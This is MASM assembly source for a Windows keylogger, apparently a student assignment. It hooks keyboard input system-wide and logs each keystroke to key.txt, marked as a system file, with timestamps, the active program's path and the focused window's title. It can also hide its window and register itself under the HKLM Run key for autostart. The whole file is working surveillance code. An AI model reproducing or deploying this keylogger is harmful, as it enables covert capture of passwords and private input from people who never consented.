	.386
	.model flat, stdcall
	option casemap :none
;-------------------------------------------------------------------------------------------------------------
;include定义
include         keyhook.inc
;--------------------------------------------------------------------------------------------------------------------
; 数据段
        .data?
hInstance        dd    ?
hWinMain         dd    ?
hMenu            dd    ?
hIcon            dd    ?

hWinStatus       dd    ?
hWinEdit         dd    ?
hFile            dd    ?
hActiveWindow    dd    ?

keyradix         dd    ?
hide             dd    ?
lpAppName        dd    ?
hFont            dd    ?
buff             db  200 DUP (?)

	.const
szClassName      db    'keyhook',0
szClass          db    'edit',0
szFilename       db    '\key.txt',0

FormatTime       db    'HH:mm:ss', 0
FormatDate       db    'Time: yyyy/MM/dd/', 0
FomateTime1      db    'HH:mm',0
FormatLen        db    '总长度:%d',0
FormatHex        db    '%c[%02xH] ',0
FormatDec        db    '%c[%dD] ',0
FontName         db     '宋体',0
Application      db    'Application: ', 0
FocusWindows     db    'FocusWindows: ',0
CTRL             dw    0a0dh,0
endstr           db   "----------------------------------------------------------------------------------------------------",0

szKeyAutoRun     db    'SoftWare\Microsoft\Windows\CurrentVersion\Run',0
szValueAutoRun   db    'AutoRun',0
Error            db    '程序已在运行', 0
szMenuAbout      db    '关于本程序(&A)...',0
AboutMsg         db    ' cs1301 U201314781 张国强 ',0

dwMenuHelp       dd    0,IDM_MENUHELP,0,0
dwStatusWidth    dd    60,130,-1
;---------------------------------------------------------------------------------------------------------------------------------
;代码段
	.code
;设置注册表键值
RegSetValue  proc  lpszKey,lpszValueName,lpszValue,dwValueType,dwSize
	local  @hKey:dword
	invoke  RegCreateKey,HKEY_LOCAL_MACHINE,lpszKey,addr @hKey
	.if  eax == ERROR_SUCCESS
		invoke RegSetValueEx,@hKey,lpszValueName,NULL, dwValueType,lpszValue,dwSize
		invoke  RegCloseKey,@hKey
	.endif
	ret
RegSetValue  endp
;删除注册表键值
RegDelValue  proc  lpszKey,lpszValueName
	local  @hKey:dword
	invoke  RegOpenKeyEx,HKEY_LOCAL_MACHINE,lpszKey,NULL, KEY_WRITE,addr @hKey
	.if  eax == ERROR_SUCCESS
		invoke  RegDeleteValue,@hKey,lpszValueName
		invoke  RegCloseKey,@hKey
	.endif
	ret
RegDelValue  endp
;设置或取消开机自启动
SetAutoRun  proc  dwFlag
	.if dwFlag ;dwFlag==1添加自启动，dwFlag==0取消自启动
		invoke GetModuleFileName,NULL,addr buff,200
		inc eax
		invoke RegSetValue,addr szKeyAutoRun,addr szValueAutoRun,addr buff,REG_SZ,eax
	.else
		invoke RegDelValue,addr szKeyAutoRun,addr szValueAutoRun
	.endif
	ret
SetAutoRun endp
;查询注册表信息，初始化自启动菜单项的显示
CheckAutoRun  proc  lpszKey,lpszValueName
	local  @hKey:dword
	invoke  RegOpenKeyEx,HKEY_LOCAL_MACHINE,lpszKey,NULL,KEY_QUERY_VALUE,addr @hKey
	.if  eax == ERROR_SUCCESS
		invoke  RegQueryValueEx,@hKey,lpszValueName,NULL,NULL,NULL,NULL
		.if eax == ERROR_SUCCESS
			invoke  CheckMenuItem,hMenu,IDM_RUN,MF_CHECKED
		.endif
		invoke  RegCloseKey,@hKey
	.endif
	ret
CheckAutoRun  endp

Quit    proc
	invoke  DeleteObject,hFont
	invoke  KillTimer,hWinMain,1
	invoke  UninstallHook
	invoke  CloseHandle, hFile
	invoke  DestroyWindow,hWinMain
	invoke  PostQuitMessage,NULL
	ret
Quit    endp
;调节编辑区状态栏尺寸子函数
Resize    proc
	local  @stRect:RECT,@stRect1:RECT
	invoke  MoveWindow,hWinStatus,0,0,0,0,TRUE
	invoke  GetWindowRect,hWinStatus,addr @stRect
	invoke  GetClientRect,hWinMain,addr @stRect1
	mov  ecx,@stRect1.right
	sub  ecx,@stRect1.left
	mov  eax,@stRect1.bottom
	sub  eax,@stRect1.top
	sub  eax,@stRect.bottom
	add  eax,@stRect.top
	invoke  MoveWindow,hWinEdit,0,0,ecx,eax,TRUE
	ret
Resize    endp
;保存输入的字符ascii码，根据菜单选择格式化为不同形式保存
SaveFile    proc  ascii:dword
	local  @bytes_written:dword,@len_string:dword
	mov eax, ascii
	invoke  wsprintf,addr buff,keyradix,eax,eax
	mov @len_string, eax
	invoke SetFilePointer, hFile, NULL, NULL, FILE_END
	invoke WriteFile, hFile, addr buff,@len_string, addr @bytes_written, NULL
	.if ascii==0dh
		invoke WriteFile, hFile, addr CTRL,2,addr @bytes_written, NULL
	.endif
	ret
SaveFile   endp
;显示结束分隔符
Writeend proc
local  @bytes_written:dword
	invoke SetFilePointer, hFile, NULL, NULL, FILE_END
	invoke WriteFile, hFile, addr CTRL, 2, addr @bytes_written, NULL
	invoke WriteFile, hFile, addr endstr, 100,addr @bytes_written, NULL
	ret
Writeend endp
;写入窗口标题时间路径等信息
WriteInfo proc len:dword,hWindow:dword
	local  @bytes_written:dword, @len_string:dword
	local   @stST:SYSTEMTIME
	invoke SetFilePointer, hFile, NULL, NULL, FILE_END
	invoke WriteFile, hFile, addr CTRL, 2, addr @bytes_written, NULL
	invoke WriteFile, hFile, addr CTRL, 2,addr @bytes_written, NULL
	;获取当地日期时间并按指定格式格式化后写入文件
	invoke  GetLocalTime,addr @stST
	invoke GetDateFormat,NULL, NULL, addr @stST, addr FormatDate , addr buff,200
	dec eax
	mov @len_string,eax
	invoke WriteFile, hFile, addr buff,@len_string,addr @bytes_written, NULL
	invoke GetTimeFormat,NULL, NULL, addr @stST, addr FormatTime , addr buff,200
	dec eax
	mov @len_string,eax
	invoke WriteFile, hFile, addr buff,@len_string, addr @bytes_written, NULL
	invoke WriteFile, hFile, addr CTRL, 2,addr @bytes_written, NULL
	;写入正在进行输入程序的全路径
	invoke WriteFile, hFile, addr Application,13, addr @bytes_written, NULL
	invoke WriteFile, hFile, lpAppName,len,addr @bytes_written, NULL
	invoke WriteFile, hFile, addr CTRL, 2, addr @bytes_written, NULL
	;获取并写入正在进行聚焦输入的窗口标题
	invoke GetWindowText,hWindow,addr buff ,200
	mov  @len_string,eax
	invoke WriteFile, hFile, addr FocusWindows,14, addr @bytes_written, NULL
	invoke WriteFile, hFile, addr buff,@len_string, addr @bytes_written, NULL
	invoke WriteFile, hFile, addr CTRL, 2,addr @bytes_written, NULL
	ret
WriteInfo endp

;窗口消息处理函数
ProcWinMain  proc  uses ebx edi esi hWnd,uMsg,wParam,lParam
	local  @hSysMenu
	local  @szBuffer[100]:byte
	local  @dwTemp
	local  @font:LOGFONT
	mov  eax,uMsg
	.if  eax ==  WM_CREATE
;----------------------------------------------------------------------------------------------------------
;安装钩子
		invoke  InstallHook,hWnd,WM_HOOK
		.if  !eax
			invoke Quit
		.else
			mov lpAppName,eax
		.endif
;------------------------------------------------------------------------------------------------------------
;创建输出文件
		invoke  GetModuleFileName, hInstance, addr buff, 200
		invoke  PathRemoveFileSpec ,addr buff
		invoke lstrcat, addr buff,addr szFilename
		invoke CreateFile,addr buff,GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_SYSTEM,NULL
		.if eax == INVALID_HANDLE_VALUE
			invoke Quit
		.else
			mov hFile, eax
		.endif

;---------------------------------------------------------------------------------------------------------------
;创建编辑栏和状态栏并添加计时器定时刷新状态栏时间
		invoke  CreateStatusWindow,WS_CHILD OR WS_VISIBLE or SBS_SIZEGRIP,NULL,hWnd,ID_STATUSBAR
		mov  hWinStatus,eax
		invoke  SendMessage,hWinStatus,SB_SETPARTS,3,offset dwStatusWidth

		invoke  CreateWindowEx,WS_EX_CLIENTEDGE,addr szClass,NULL,\
			WS_CHILD or WS_VISIBLE or ES_MULTILINE or ES_WANTRETURN or WS_HSCROLL or WS_VSCROLL,\
			0,0,0,0,hWnd,ID_EDIT,hInstance,NULL
		mov  hWinEdit,eax
		;设置编辑框字体为宋体
		invoke lstrcpy,addr @font.lfFaceName,addr FontName
		mov @font.lfHeight,20
		mov @font.lfWidth,0
		mov @font.lfEscapement,0
		mov @font.lfItalic,0
		mov @font.lfStrikeOut,0
		mov @font.lfUnderline,0
		mov @font.lfWeight,600
		invoke CreateFontIndirect,addr @font
		mov hFont,eax
		invoke  SendMessage,hWinEdit,WM_SETFONT,hFont,NULL
		invoke SetFocus,hWinEdit ;聚焦编辑框
		invoke  Resize ;调节编辑框状态栏尺寸
		invoke  SetTimer,hWnd,1,500,NULL
;--------------------------------------------------------------------------------------------------------------
;初始化保存菜单选项和自启动菜单选项添加系统菜单
		invoke  CheckMenuRadioItem,hMenu,IDM_HEX,IDM_DEC,IDM_HEX,MF_BYCOMMAND
		push offset FormatHex
		pop  keyradix

		mov hide,0

		invoke CheckAutoRun,addr szKeyAutoRun,addr szValueAutoRun
		invoke  GetSystemMenu,hWnd,FALSE
		mov  @hSysMenu,eax
		invoke  AppendMenu,@hSysMenu,MF_SEPARATOR,0,NULL
		invoke  AppendMenu,@hSysMenu,0,IDM_ABOUT,offset szMenuAbout

;-----------------------------------------------------------------------------------------------------------------------------------
;窗口大小改变时调节编辑区尺寸
	.elseif  eax ==  WM_SIZE
		invoke  Resize
;-------------------------------------------------------------------------------------------------------------------------------------
;退出程序
	.elseif  eax ==  WM_CLOSE
		invoke Writeend
		invoke  Quit
;-----------------------------------------------------------------------------------------------------------------------------------
; HOOK消息处理
	.elseif  eax ==  WM_HOOK
		mov  eax,wParam
		.if  al == 0dh
			mov  eax,0a0dh
		.endif
		mov  @dwTemp,eax
		invoke  SendDlgItemMessage,hWnd,ID_EDIT,EM_REPLACESEL,0,addr @dwTemp;发送EM_REPLACESEL消息给编辑区，显示捕获的字符
		invoke  GetWindowTextLength,hWinEdit
		invoke  wsprintf,addr @szBuffer,addr FormatLen,eax
		invoke  SendMessage,hWinStatus,SB_SETTEXT,1,addr @szBuffer ;状态栏显示输入字符的总长度
		invoke GetForegroundWindow   ;获取当前进行输入窗口的句柄，句柄改变则写入窗口标题时间路径等信息
		.if eax!=hActiveWindow
			mov hActiveWindow,eax
			invoke WriteInfo,lParam,eax
			invoke SendMessage,hWinStatus,SB_SETTEXT,2, lpAppName;状态栏显示正在运行程序的全路径
		.endif
		invoke SaveFile,wParam;保存输入信息
;------------------------------------------------------------------------------------------------------------
; 处理菜单及加速键消息
	.elseif  eax ==  WM_COMMAND
		mov  eax,wParam
		movzx  eax,ax
		.if  eax ==  IDM_EXIT;退出程序
			invoke  Writeend
			invoke  Quit
		.elseif  eax ==IDM_HEX;保存为十六进制
			push offset FormatHex
			pop  keyradix
			invoke  CheckMenuRadioItem,hMenu,IDM_HEX,IDM_DEC,eax,MF_BYCOMMAND
		.elseif  eax ==IDM_DEC;保存为十进制
			push offset FormatDec
			pop  keyradix
			invoke  CheckMenuRadioItem,hMenu,IDM_HEX,IDM_DEC,eax,MF_BYCOMMAND
		.elseif eax==IDM_HIDE;切换显示/隐藏状态
			.if hide
				mov hide,0
				invoke ShowWindow,hWnd,SW_SHOW
				invoke SetForegroundWindow, hWnd
			.else
				mov hide,1
				invoke ShowWindow,hWnd,SW_HIDE

			.endif

		.elseif eax==IDM_RUN;自启动
			invoke  GetMenuState,hMenu,IDM_RUN,MF_BYCOMMAND
			.if  eax ==  MF_CHECKED
				invoke SetAutoRun,0
				mov  eax,MF_UNCHECKED
			.else
				invoke SetAutoRun,1
				mov  eax,MF_CHECKED
			.endif
			invoke  CheckMenuItem,hMenu,IDM_RUN,eax
		.elseif eax == IDM_ABOUT;关于程序信息
			invoke ShellAbout,hWnd,addr szClassName,addr AboutMsg,hIcon
		.endif
;-----------------------------------------------------------------------------------------------------------
; 处理系统菜单
	.elseif  eax == WM_SYSCOMMAND
		mov  eax,wParam
		movzx  eax,ax
		.if  eax == IDM_ABOUT;关于程序信息
			invoke ShellAbout,hWnd,addr szClassName,addr AboutMsg,hIcon
		.else
			invoke  DefWindowProc,hWnd,uMsg,wParam,lParam
			ret
		.endif
;-------------------------------------------------------------------------------------------------------------
;状态栏显示菜单选项提示文本
	.elseif  eax ==  WM_MENUSELECT
		invoke  MenuHelp,WM_MENUSELECT,wParam,lParam,lParam,hInstance,\
			hWinStatus,offset dwMenuHelp
;-----------------------------------------------------------------------------------------------------------
;刷新状态栏时间显示
	.elseif  eax ==  WM_TIMER
		invoke GetTimeFormat ,NULL, NULL,NULL, addr FomateTime1, addr @szBuffer,100
		invoke  SendMessage,hWinStatus,SB_SETTEXT,0,addr @szBuffer
;-----------------------------------------------------------------------------------------------------------
;调用默认消息处理函数
	.else
		invoke  DefWindowProc,hWnd,uMsg,wParam,lParam
		ret
	.endif
;---------------------------------------------------------------------
	xor  eax,eax
	ret
ProcWinMain  endp
;----------------------------------------------------------------------------------------------------------------------------------
;窗口主函数
WinMain  proc
	local  @stWndClass:WNDCLASSEX
	local  @stMsg:MSG
	local  @hAccelerator
	invoke FindWindow, addr szClassName, NULL  ;窗口已存在则退出显示提示信息
	.if eax != NULL
		invoke MessageBox, NULL, addr Error, addr szClassName  , MB_ICONERROR
		invoke ExitProcess, NULL
	.endif
	invoke  GetModuleHandle,NULL
	mov  hInstance,eax
;加载菜单和快捷键
	invoke  LoadMenu,hInstance,IDM_MAIN
	mov  hMenu,eax
	invoke  LoadAccelerators,hInstance,IDA_MAIN
	mov  @hAccelerator,eax
;------------------------------------------------------------------------------------------------
; 注册窗口类
	invoke  RtlZeroMemory,addr @stWndClass,sizeof @stWndClass
	invoke  LoadIcon,hInstance,ICO_MAIN
	mov  @stWndClass.hIcon,eax
	mov  @stWndClass.hIconSm,eax
	mov    hIcon,eax

	invoke  LoadCursor,0,IDC_ARROW
	mov  @stWndClass.hCursor,eax

	push  hInstance
	pop  @stWndClass.hInstance
	mov  @stWndClass.cbSize,sizeof WNDCLASSEX
	mov  @stWndClass.style,CS_HREDRAW or CS_VREDRAW
	mov  @stWndClass.lpfnWndProc,offset ProcWinMain
	mov  @stWndClass.hbrBackground,COLOR_WINDOW + 1
	mov  @stWndClass.lpszClassName,offset szClassName
	invoke  RegisterClassEx,addr @stWndClass
;-------------------------------------------------------------------------------------------------
; 建立并显示窗口
	invoke  CreateWindowEx,WS_EX_CLIENTEDGE,\
		offset szClassName,offset szClassName,\
		WS_OVERLAPPEDWINDOW,\
		300,200,600,450,\
		NULL,hMenu,hInstance,NULL
	mov  hWinMain,eax
	invoke  ShowWindow,hWinMain,SW_SHOWNORMAL
	invoke  UpdateWindow,hWinMain

;--------------------------------------------------------------------------------------------------------------------
; 消息循环
	.while  TRUE
		invoke  GetMessage,addr @stMsg,NULL,0,0
		.break  .if eax  == 0
		invoke  TranslateAccelerator,hWinMain,@hAccelerator,addr @stMsg
		.if  eax == 0
			invoke  DispatchMessage,addr @stMsg
		.endif
	.endw
	ret
WinMain  endp
;----------------------------------------------------------------------------------------------------------------------------
;主程序
start:
	invoke  WinMain
	invoke  ExitProcess,NULL
;----------------------------------------------------------------------------------------------------------------------
end  start
